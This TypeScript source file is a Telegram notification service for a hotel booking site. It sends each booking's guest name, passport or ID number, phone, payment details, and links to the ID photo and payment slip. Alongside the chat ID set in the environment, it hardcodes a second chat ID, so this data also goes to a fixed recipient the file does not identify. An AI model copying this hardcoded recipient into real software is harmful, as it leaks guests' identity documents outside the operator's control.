// Telegram notification service for booking alerts

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ADDITIONAL_CHAT_IDS = ["5380653319"];

interface BookingNotification {
  fullName: string;
  idNumber: string;
  phoneNumber: string | null;
  customerNotes: string | null;
  roomNumber: number;
  roomNumbers: string | null;
  extraBeds: string | null;
  checkInDate: string;
  checkOutDate: string;
  totalNights: number;
  totalMVR: number;
  totalUSD: string;
  idPhoto: string | null;
  paymentSlip: string | null;
}

function getAllChatIds(): string[] {
  const chatIds: string[] = [];
  if (TELEGRAM_CHAT_ID) chatIds.push(TELEGRAM_CHAT_ID);
  chatIds.push(...ADDITIONAL_CHAT_IDS);
  return chatIds;
}

export async function sendBookingNotification(booking: BookingNotification, appUrl?: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log("Telegram bot token not configured, skipping notification");
    return false;
  }

  const chatIds = getAllChatIds();
  if (chatIds.length === 0) {
    console.log("No Telegram chat IDs configured, skipping notification");
    return false;
  }

  try {
    const roomsDisplay = booking.roomNumbers 
      ? booking.roomNumbers.split(',').map(r => `Room ${r.trim()}`).join(', ')
      : `Room ${booking.roomNumber}`;
    
    const extraBedsDisplay = booking.extraBeds 
      ? `Extra Beds: Room${booking.extraBeds.includes(',') ? 's' : ''} ${booking.extraBeds}`
      : "Extra Beds: None";

    const message = `
🏨 *NEW BOOKING RECEIVED*

👤 *Guest Details*
Name: ${booking.fullName}
ID/Passport: ${booking.idNumber}
Phone: ${booking.phoneNumber || "Not provided"}

🛏️ *Room Information*
Rooms: ${roomsDisplay}
${extraBedsDisplay}
Check-in: ${booking.checkInDate}
Check-out: ${booking.checkOutDate}
Nights: ${booking.totalNights}

💰 *Payment*
Total: ${booking.totalMVR.toLocaleString()} MVR
(USD ${booking.totalUSD})
Payment Slip: ${booking.paymentSlip ? "Uploaded" : "Not uploaded"}

${booking.customerNotes ? `📝 *Customer Notes*\n${booking.customerNotes}\n` : ""}📅 Booked on: ${new Date().toLocaleDateString()}
    `.trim();

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    for (const chatId of chatIds) {
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      });

      if (!response.ok) {
        const error = await response.text();
        console.error(`Telegram API error for chat ${chatId}:`, error);
      }
    }

    // If there's an ID photo, send it
    if (booking.idPhoto && appUrl) {
      const idPhotoUrl = `${appUrl}/uploads/${booking.idPhoto}`;
      await sendPhoto(idPhotoUrl, `ID Card/Passport for ${booking.fullName}`);
    }

    // If there's a payment slip, send it as a photo
    if (booking.paymentSlip && appUrl) {
      const photoUrl = `${appUrl}/uploads/${booking.paymentSlip}`;
      await sendPhoto(photoUrl, `Payment slip for ${booking.fullName}`);
    }

    console.log("Telegram notification sent successfully");
    return true;
  } catch (error) {
    console.error("Failed to send Telegram notification:", error);
    return false;
  }
}

async function sendPhoto(photoUrl: string, caption: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) return false;

  const chatIds = getAllChatIds();
  if (chatIds.length === 0) return false;

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    
    for (const chatId of chatIds) {
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          photo: photoUrl,
          caption: caption,
        }),
      });

      if (!response.ok) {
        console.error(`Failed to send photo to chat ${chatId}`);
      }
    }

    return true;
  } catch (error) {
    console.error("Failed to send photo to Telegram:", error);
    return false;
  }
}
